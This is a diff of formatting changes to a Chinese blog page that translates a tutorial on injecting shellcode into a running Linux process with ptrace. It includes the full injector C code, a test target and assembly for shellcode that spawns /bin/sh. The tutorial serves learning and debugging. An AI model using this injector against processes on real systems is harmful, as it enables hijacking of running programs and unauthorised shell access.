@@ -6,10 +6,10 @@
 
 
 <html class="theme-next muse use-motion" lang="zh-Hans">
-<head>
-  <meta charset="UTF-8"/>
-<meta http-equiv="X-UA-Compatible" content="IE=edge" />
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <script>
     (function(){
         if(''){
@@ -28,8 +28,8 @@
 
 
 
-<meta http-equiv="Cache-Control" content="no-transform" />
-<meta http-equiv="Cache-Control" content="no-siteapp" />
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
 
 
 
@@ -47,7 +47,7 @@
 
   
   
-  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
 
 
 
@@ -81,23 +81,23 @@
 
 
 
-<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
 
-<link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />
-
-
-  <meta name="keywords" content="M0rk,blog,security,hack,Hexo" />
+<link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css">
 
 
-
-
-
-  <link rel="alternate" href="/atom.xml" title="M0rk's Blog" type="application/atom+xml" />
+  <meta name="keywords" content="M0rk,blog,security,hack,Hexo">
 
 
 
 
-  <link rel="shortcut icon" type="image/x-icon" href="/images/favicon.ico?v=5.1.1" />
+
+  <link rel="alternate" href="/atom.xml" title="M0rk's Blog" type="application/atom+xml">
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/images/favicon.ico?v=5.1.1">
 
 
 
@@ -105,12 +105,12 @@
 
 
 <meta name="description" content="12345译文声明本文是翻译文章，文章原作者0x00pf，文章来源：0x00sec.org原文地址：https://0x00sec.org/t/linux-infecting-running-processes/1097第一篇翻译的文章，如有不当，那也没有什么办法0.0主要是在工作中遇到了一个需要注入的场景就学习了一下。 前言 我们已经知道了如何向一个二进制文件注入代码让程序在下次执行的时候执行我">
-<meta name="keywords">
 <meta property="og:type" content="article">
 <meta property="og:title" content="linux进程注入(-)">
 <meta property="og:url" content="http://kevien.github.io/2018/01/28/linux进程注入/index.html">
-<meta property="og:site_name" content="M0rk's Blog">
+<meta property="og:site_name" content="M0rk&#39;s Blog">
 <meta property="og:description" content="12345译文声明本文是翻译文章，文章原作者0x00pf，文章来源：0x00sec.org原文地址：https://0x00sec.org/t/linux-infecting-running-processes/1097第一篇翻译的文章，如有不当，那也没有什么办法0.0主要是在工作中遇到了一个需要注入的场景就学习了一下。 前言 我们已经知道了如何向一个二进制文件注入代码让程序在下次执行的时候执行我">
+<meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="http://kevien.github.io/2018/01/28/linux进程注入/testinject.png">
 <meta property="og:image" content="http://kevien.github.io/2018/01/28/linux进程注入/poc.png">
 <meta property="og:updated_time" content="2020-01-02T08:38:27.691Z">
@@ -145,7 +145,7 @@
 
 
 
-  <link rel="canonical" href="http://kevien.github.io/2018/01/28/linux进程注入/"/>
+  <link rel="canonical" href="http://kevien.github.io/2018/01/28/linux进程注入/">
 
 
 
@@ -154,7 +154,7 @@
   <title>linux进程注入(-) | M0rk's Blog</title>
 </head>
 
-<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
 
   
 
@@ -179,13 +179,13 @@
   <div class="container sidebar-position-left page-post-detail ">
     <div class="headband"></div>
 
-    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
       <div class="header-inner"><div class="site-brand-wrapper">
   <div class="site-meta ">
     
 
     <div class="custom-logo-site-title">
-      <a href="/"  class="brand" rel="start">
+      <a href="/" class="brand" rel="start">
         <span class="logo-line-before"><i></i></span>
         <span class="site-title">M0rk's Blog</span>
         <span class="logo-line-after"><i></i></span>
@@ -215,7 +215,7 @@
         <li class="menu-item menu-item-home">
           <a href="/" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
             
             首页
           </a>
@@ -225,7 +225,7 @@
         <li class="menu-item menu-item-archives">
           <a href="/archives" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
             
             归档
           </a>
@@ -235,7 +235,7 @@
         <li class="menu-item menu-item-tags">
           <a href="/tags" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
             
             标签
           </a>
@@ -245,7 +245,7 @@
         <li class="menu-item menu-item-about">
           <a href="/about" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
             
             关于
           </a>
@@ -255,7 +255,7 @@
         <li class="menu-item menu-item-sitemap">
           <a href="/sitemap.xml" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br />
+              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>
             
             站点地图
           </a>
@@ -268,7 +268,7 @@
             <a href="javascript:;" class="popup-trigger">
           
             
-              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
             
             搜索
           </a>
@@ -289,9 +289,7 @@
       <i class="fa fa-times-circle"></i>
     </span>
     <div class="local-search-input-wrapper">
-      <input autocapitalize="off" autocomplete="off" autocorrect="off"
-             placeholder="搜索..." spellcheck="false"
-             type="text" id="local-search-input">
+      <input autocapitalize="off" autocomplete="off" autocorrect="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
     </div>
   </div>
   <div id="local-search-result"></div>
@@ -323,16 +321,16 @@
   
   
 
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+  <article class="post post-type-normal " itemscope="" itemtype="http://schema.org/Article">
     <link itemprop="mainEntityOfPage" href="http://kevien.github.io/2018/01/28/linux进程注入/">
 
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="M0rk">
       <meta itemprop="description" content="">
       <meta itemprop="image" content="/uploads/avatar.jpg">
     </span>
 
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
       <meta itemprop="name" content="M0rk's Blog">
     </span>
 
@@ -426,7 +424,7 @@
       
 
       
-        <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">译文声明</div><div class="line">本文是翻译文章，文章原作者0x00pf，文章来源：0x00sec.org</div><div class="line">原文地址：https://0x00sec.org/t/linux-infecting-running-processes/1097</div><div class="line">第一篇翻译的文章，如有不当，那也没有什么办法0.0</div><div class="line">主要是在工作中遇到了一个需要注入的场景就学习了一下。</div></pre></td></tr></table></figure>
+        <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">译文声明</span><br><span class="line">本文是翻译文章，文章原作者0x00pf，文章来源：0x00sec.org</span><br><span class="line">原文地址：https://0x00sec.org/t/linux-infecting-running-processes/1097</span><br><span class="line">第一篇翻译的文章，如有不当，那也没有什么办法0.0</span><br><span class="line">主要是在工作中遇到了一个需要注入的场景就学习了一下。</span><br></pre></td></tr></table></figure>
 <h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><ul>
 <li>我们已经知道了如何向一个二进制文件注入代码让程序在下次执行的时候执行我们的代码，但是如何向一个已在运行的进程中注入代码呢?这篇文章我将介绍如何去操作其它进程内存的一些基本技巧…换句话说，就是教你如何去写一个属于你自己的调试器。<h4 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h4></li>
 <li>在去介绍技术细节之前，让我先来介绍几个需要注入代码到运行中进程的场景。</li>
@@ -441,7 +439,7 @@
 <li>这篇文章我们主要关注第二种，当你对这些基本的知识点熟悉之后，后面在你调试程序的时候就不会有什么问题了。<h4 id="附加到正在运行的进程"><a href="#附加到正在运行的进程" class="headerlink" title="附加到正在运行的进程"></a>附加到正在运行的进程</h4></li>
 <li>修改正在运行的进程之前我们首先做的是要调试它，这个过程被称为附加，这也是gdb的一个命令，让我们看下面的代码：</li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;string.h&gt;</div><div class="line">#include &lt;stdint.h&gt;</div><div class="line"></div><div class="line">#include &lt;sys/ptrace.h&gt;</div><div class="line">#include &lt;sys/types.h&gt;</div><div class="line">#include &lt;sys/wait.h&gt;</div><div class="line">#include &lt;unistd.h&gt;</div><div class="line"></div><div class="line">#include &lt;sys/user.h&gt;</div><div class="line">#include &lt;sys/reg.h&gt;</div><div class="line"></div><div class="line">int</div><div class="line">main (int argc, char *argv[])</div><div class="line">&#123;</div><div class="line">  pid_t                   target;</div><div class="line">  struct user_regs_struct regs;</div><div class="line">  int                     syscall;</div><div class="line">  long                    dst;</div><div class="line"></div><div class="line">  if (argc != 2)</div><div class="line">    &#123;</div><div class="line">      fprintf (stderr, &quot;Usage:\n\t%s pid\n&quot;, argv[0]);</div><div class="line">      exit (1);</div><div class="line">    &#125;</div><div class="line">  target = atoi (argv[1]);</div><div class="line">  printf (&quot;+ Tracing process %d\n&quot;, target);</div><div class="line">  if ((ptrace (PTRACE_ATTACH, target, NULL, NULL)) &lt; 0)</div><div class="line">    &#123;</div><div class="line">      perror (&quot;ptrace(ATTACH):&quot;);</div><div class="line">      exit (1);</div><div class="line">    &#125;</div><div class="line">  printf (&quot;+ Waiting for process...\n&quot;);</div><div class="line">  wait (NULL);</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line"></span><br><span class="line">#include &lt;sys/ptrace.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;sys/wait.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">#include &lt;sys/user.h&gt;</span><br><span class="line">#include &lt;sys/reg.h&gt;</span><br><span class="line"></span><br><span class="line">int</span><br><span class="line">main (int argc, char *argv[])</span><br><span class="line">&#123;</span><br><span class="line">  pid_t                   target;</span><br><span class="line">  struct user_regs_struct regs;</span><br><span class="line">  int                     syscall;</span><br><span class="line">  long                    dst;</span><br><span class="line"></span><br><span class="line">  if (argc != 2)</span><br><span class="line">    &#123;</span><br><span class="line">      fprintf (stderr, &quot;Usage:\n\t%s pid\n&quot;, argv[0]);</span><br><span class="line">      exit (1);</span><br><span class="line">    &#125;</span><br><span class="line">  target = atoi (argv[1]);</span><br><span class="line">  printf (&quot;+ Tracing process %d\n&quot;, target);</span><br><span class="line">  if ((ptrace (PTRACE_ATTACH, target, NULL, NULL)) &lt; 0)</span><br><span class="line">    &#123;</span><br><span class="line">      perror (&quot;ptrace(ATTACH):&quot;);</span><br><span class="line">      exit (1);</span><br><span class="line">    &#125;</span><br><span class="line">  printf (&quot;+ Waiting for process...\n&quot;);</span><br><span class="line">  wait (NULL);</span><br></pre></td></tr></table></figure>
 <ul>
 <li>在这段代码中我们可以看到main函数接收一个参数，这里是pid（进程id号），即我们想要去注入的进程。我们在后面的每次ptrace系统调用的时候都会用的到。</li>
 <li>我们使用ptrace系统调用，第一个参数是PTRACE_ATTACH,第二个参数是我们想要附加的进程id，之后我们调用wait的SIGTRAP信号去判断附加进程是否完成。</li>
@@ -457,13 +455,13 @@
 <ul>
 <li>简单点儿，我们打算在控制了进程之后，在IP寄存器地址处注入我们的代码，后面的代码中可以看到，我们将直接注入一段典型的得到shell session的shellcode。因此我们也不期望交还控制权给原来的进程。换句话说，我们不在乎是否会破坏原有的进程。<h4 id="获取寄存器和内存信息"><a href="#获取寄存器和内存信息" class="headerlink" title="获取寄存器和内存信息"></a>获取寄存器和内存信息</h4></li>
 <li><p>下面代码注入我们的“恶意代码”到目标进程：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">printf (&quot;+ Getting Registers\n&quot;);</div><div class="line">if ((ptrace (PTRACE_GETREGS, target, NULL, &amp;regs)) &lt; 0)</div><div class="line">  &#123;</div><div class="line">    perror (&quot;ptrace(GETREGS):&quot;);</div><div class="line">    exit (1);</div><div class="line">  &#125;</div><div class="line"></div><div class="line">printf (&quot;+ Injecting shell code at %p\n&quot;, (void*)regs.rip);</div><div class="line">inject_data (target, shellcode, (void*)regs.rip, SHELLCODE_SIZE);</div><div class="line">regs.rip += 2;</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">printf (&quot;+ Getting Registers\n&quot;);</span><br><span class="line">if ((ptrace (PTRACE_GETREGS, target, NULL, &amp;regs)) &lt; 0)</span><br><span class="line">  &#123;</span><br><span class="line">    perror (&quot;ptrace(GETREGS):&quot;);</span><br><span class="line">    exit (1);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">printf (&quot;+ Injecting shell code at %p\n&quot;, (void*)regs.rip);</span><br><span class="line">inject_data (target, shellcode, (void*)regs.rip, SHELLCODE_SIZE);</span><br><span class="line">regs.rip += 2;</span><br></pre></td></tr></table></figure>
 </li>
 <li><p>上面的代码中首先看到的是我们调用了ptrace,其中第一个参数是PTRACE_GETREGS,这将使我们的程序可以获取到被控制进程的寄存器内容。</p>
 </li>
 <li>之后，我们使用一个方法注入我们的shellcode到目标进程。注意我们获取了regs.rip(即目标进程当前的IP寄存器的值)，inject_data函数，如你所想，拷贝我们的shellcode到reg.rip所指向的内存地址处。</li>
 <li><p>让我们看看是怎么样的。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">inject_data (pid_t pid, unsigned char *src, void *dst, int len)</div><div class="line">&#123;</div><div class="line">  int      i;</div><div class="line">  uint32_t *s = (uint32_t *) src;</div><div class="line">  uint32_t *d = (uint32_t *) dst;</div><div class="line"></div><div class="line">  for (i = 0; i &lt; len; i+=4, s++, d++)</div><div class="line">    &#123;</div><div class="line">      if ((ptrace (PTRACE_POKETEXT, pid, d, *s)) &lt; 0)</div><div class="line">	&#123;</div><div class="line">	  perror (&quot;ptrace(POKETEXT):&quot;);</div><div class="line">	  return -1;</div><div class="line">	&#125;</div><div class="line">    &#125;</div><div class="line">  return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">inject_data (pid_t pid, unsigned char *src, void *dst, int len)</span><br><span class="line">&#123;</span><br><span class="line">  int      i;</span><br><span class="line">  uint32_t *s = (uint32_t *) src;</span><br><span class="line">  uint32_t *d = (uint32_t *) dst;</span><br><span class="line"></span><br><span class="line">  for (i = 0; i &lt; len; i+=4, s++, d++)</span><br><span class="line">    &#123;</span><br><span class="line">      if ((ptrace (PTRACE_POKETEXT, pid, d, *s)) &lt; 0)</span><br><span class="line">	&#123;</span><br><span class="line">	  perror (&quot;ptrace(POKETEXT):&quot;);</span><br><span class="line">	  return -1;</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 </li>
 <li><p>很简单是不是，在这个函数中只有两点是需要稍微解释说明的</p>
 </li>
@@ -474,7 +472,7 @@
 </ol>
 <ul>
 <li><p>现在目标进程的内存已经被注入包含我们需要运行的代码了，现在要做的就是交回我们的控制权给目标进程并让它保持正常运行了。这里有几种不同的方法，这里我们需要做的是分离目标进程，因此，我们停止调试目标进程。下面的方法可以停止调试且让目标进程继续执行：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">  printf (&quot;+ Setting instruction pointer to %p\n&quot;, (void*)regs.rip);</div><div class="line">  if ((ptrace (PTRACE_SETREGS, target, NULL, &amp;regs)) &lt; 0)</div><div class="line">    &#123;</div><div class="line">      perror (&quot;ptrace(GETREGS):&quot;);</div><div class="line">      exit (1);</div><div class="line">    &#125;</div><div class="line">  printf (&quot;+ Run it!\n&quot;);</div><div class="line"> </div><div class="line">  if ((ptrace (PTRACE_DETACH, target, NULL, NULL)) &lt; 0)</div><div class="line">	&#123;</div><div class="line">	  perror (&quot;ptrace(DETACH):&quot;);</div><div class="line">	  exit (1);</div><div class="line">	&#125;</div><div class="line">  return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">  printf (&quot;+ Setting instruction pointer to %p\n&quot;, (void*)regs.rip);</span><br><span class="line">  if ((ptrace (PTRACE_SETREGS, target, NULL, &amp;regs)) &lt; 0)</span><br><span class="line">    &#123;</span><br><span class="line">      perror (&quot;ptrace(GETREGS):&quot;);</span><br><span class="line">      exit (1);</span><br><span class="line">    &#125;</span><br><span class="line">  printf (&quot;+ Run it!\n&quot;);</span><br><span class="line"> </span><br><span class="line">  if ((ptrace (PTRACE_DETACH, target, NULL, NULL)) &lt; 0)</span><br><span class="line">	&#123;</span><br><span class="line">	  perror (&quot;ptrace(DETACH):&quot;);</span><br><span class="line">	  exit (1);</span><br><span class="line">	&#125;</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 </li>
 <li><p>这里很容易理解，需要注意的是我们需要先把寄存器的值重新设回到以前，然后再去分离。回到前面的章节部分检查一下我们注入的代码…你注意到了在这里<br>为什么要regs.rip += 2了吗</p>
 </li>
@@ -483,29 +481,29 @@
 <li>在整个测试的过程中，当我尝试去注入代码的时候目标进程总是崩掉，一个可能的原因是目标程序中栈数据不能执行，我通过execstack 工具去排除这个原因，但是程序还是会崩掉，所以我开启了内存dump分析了一下到底发生了什么。</li>
 <li>原因是，你不能同时运行gdb去调试目标进程，否则第一个ptrace会失败，你不能用两个调试器在同一时间调试同一个程序（这句话隐藏了一个反调试的技巧; ）所以当我尝试栈溢出的方式注入代码的时候得到如下的信息：</li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">+ Tracing process 15333</div><div class="line">+ Waiting for process...</div><div class="line">+ Getting Registers</div><div class="line">+ Injecting shell code at 0x7ffe9a708728</div><div class="line">+ Setting instruction pointer to 0x7ffe9a708708</div><div class="line">+ Run it!</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">+ Tracing process 15333</span><br><span class="line">+ Waiting for process...</span><br><span class="line">+ Getting Registers</span><br><span class="line">+ Injecting shell code at 0x7ffe9a708728</span><br><span class="line">+ Setting instruction pointer to 0x7ffe9a708708</span><br><span class="line">+ Run it!</span><br></pre></td></tr></table></figure>
 <ul>
 <li>当然，这里的地址以及进程名在你的系统中可能不一样，然而，进程崩溃dump的内存可以通过gdb去检查到底发生了什么。</li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">$ gdb ./target core</div><div class="line">(... gdb start up messages removed ...)</div><div class="line">Reading symbols from ./target...(no debugging symbols found)...done.</div><div class="line">[New LWP 15333]</div><div class="line">Core was generated by `./target&apos;.</div><div class="line">Program terminated with signal SIGSEGV, Segmentation fault.</div><div class="line">#0  0x00007ffe9a708706 in ?? ()</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ gdb ./target core</span><br><span class="line">(... gdb start up messages removed ...)</span><br><span class="line">Reading symbols from ./target...(no debugging symbols found)...done.</span><br><span class="line">[New LWP 15333]</span><br><span class="line">Core was generated by `./target&apos;.</span><br><span class="line">Program terminated with signal SIGSEGV, Segmentation fault.</span><br><span class="line">#0  0x00007ffe9a708706 in ?? ()</span><br></pre></td></tr></table></figure>
 <ul>
 <li>可以看到这里发生了段地址错误，如果你对比了injector的输出信息可以发现这里有两字节的不同，修改这里将会使你注入成功。<h4 id="测试程序"><a href="#测试程序" class="headerlink" title="测试程序"></a>测试程序</h4></li>
 <li>为了测试我写了个简单的程序，这个程序只是打印了它自己的pid(你就不用去找它的pid了)，然后每隔2s打印一个helloword，打印10次，这将会给你注入的时间。</li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;unistd.h&gt;</div><div class="line"></div><div class="line">int main()</div><div class="line">&#123;   </div><div class="line">    int i;</div><div class="line"></div><div class="line">    printf (&quot;PID: %d\n&quot;, (int)getpid());</div><div class="line">    for(i = 0;i &lt; 10; ++i) &#123;</div><div class="line"></div><div class="line">	write (1, &quot;Hello World\n&quot;, 12);</div><div class="line">        sleep(2);</div><div class="line">    &#125;</div><div class="line">    getchar();</div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;   </span><br><span class="line">    int i;</span><br><span class="line"></span><br><span class="line">    printf (&quot;PID: %d\n&quot;, (int)getpid());</span><br><span class="line">    for(i = 0;i &lt; 10; ++i) &#123;</span><br><span class="line"></span><br><span class="line">	write (1, &quot;Hello World\n&quot;, 12);</span><br><span class="line">        sleep(2);</span><br><span class="line">    &#125;</span><br><span class="line">    getchar();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <ul>
 <li>我所用到的shellcode是通过如下的汇编文件生成的：</li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">section .text</div><div class="line">        global _start</div><div class="line"></div><div class="line">_start:</div><div class="line">        xor rax,rax</div><div class="line">        mov rdx,rax             ; No Env</div><div class="line">        mov rsi,rax             ; No argv</div><div class="line">        lea rdi, [rel msg]</div><div class="line"></div><div class="line">        add al, 0x3b</div><div class="line"></div><div class="line">        syscall</div><div class="line">        msg db &apos;/bin/sh&apos;,0</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">section .text</span><br><span class="line">        global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">        xor rax,rax</span><br><span class="line">        mov rdx,rax             ; No Env</span><br><span class="line">        mov rsi,rax             ; No argv</span><br><span class="line">        lea rdi, [rel msg]</span><br><span class="line"></span><br><span class="line">        add al, 0x3b</span><br><span class="line"></span><br><span class="line">        syscall</span><br><span class="line">        msg db &apos;/bin/sh&apos;,0</span><br></pre></td></tr></table></figure>
 <h4 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h4><ul>
 <li>ptrace是一个非常强大的工具，这篇文章中我们只是用到了最基本的，现在时候打开你的terminal然后输入man ptrace去学习一下它是如何的神奇了。</li>
 <li>如果你有兴趣的话，你还可以进行如下的尝试：</li>
 <li>1.修改注入代码到代码空隙</li>
 <li>2.使用更加好用的shellcode让它另起一个进程，从而保持原程序正常运行</li>
 <li>3.你的shellcode将会运行在目标项目中并且可以读取打开的文件…</li>
-<li>一如往常，你可以github上找到文章中所涉及到的代码<br><a href="https://github.com/0x00pf/0x00sec_code/tree/master/mem_inject" target="_blank" rel="external">https://github.com/0x00pf/0x00sec_code/tree/master/mem_inject</a><h4 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h4></li>
+<li>一如往常，你可以github上找到文章中所涉及到的代码<br><a href="https://github.com/0x00pf/0x00sec_code/tree/master/mem_inject" target="_blank" rel="noopener">https://github.com/0x00pf/0x00sec_code/tree/master/mem_inject</a><h4 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h4></li>
